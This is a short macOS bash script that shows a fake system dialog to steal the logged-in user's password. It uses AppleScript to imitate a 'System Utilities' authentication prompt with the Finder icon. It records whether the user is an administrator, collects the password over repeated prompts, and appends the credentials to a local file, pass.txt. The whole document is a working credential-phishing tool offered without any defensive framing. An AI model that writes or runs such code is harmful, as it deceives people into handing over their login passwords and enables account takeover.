#!/bin/bash

username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

promptcount=1

read -r -d '' applescriptCode <<'EOF'
set msg1 to "MacOS is trying to authenticate user.

Enter the password for the user "
set username to long user name of (system info)
set msg2 to " to allow this."
set dialogText to text returned of (display dialog "" & msg1 & username & msg2 with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
return dialogText
EOF

if dscl . -read /Groups/admin GroupMembership | awk '{print $2, $3, $4, $5, $6, $7, $8, $9}' | grep -q "$username"; then
    isadmin="(user is admin)"
else
    isadmin="(user is not admin)"
fi

capture=$(echo -e username="$username" + "$isadmin" \\n\\r_________________________________________________________________________________________\\n\\r\\n\\r)

for i in $( eval echo {0..$promptcount} )
do
    dialogText=$(osascript -e "$applescriptCode")
    capture="$capture$(echo -e password = "$dialogText" \\n\\r)"
done

echo "$capture" >> pass.txt
